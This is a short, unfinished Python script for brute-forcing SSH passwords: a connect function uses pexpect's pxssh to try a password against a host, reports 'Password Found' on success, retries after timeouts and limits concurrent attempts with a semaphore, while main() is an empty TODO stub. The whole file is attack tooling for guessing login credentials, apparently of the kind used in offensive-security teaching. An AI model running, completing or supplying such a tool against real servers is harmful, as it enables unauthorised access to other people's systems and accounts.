from pexpect import pxssh
import optparse
import time
from threading import *

MAXCONNECTIONS = 5
CONNECTION_LOCK = BoundedSemaphore(value=MAXCONNECTIONS)
found = False
fails = 0

def connect(host, user, password, release):
    global found
    global fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("Password Found: " + password)
        found = True
    except Exception as e:
        if "read_nonblocking" in str(e):
            fails += 1
            time.sleep(5)
            connect(host,user,password,False)
        elif "synchronize with original prompt" in str(e):
            fails += 1
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            CONNECTION_LOCK.release()


def main():
    # TODO make main
    pass

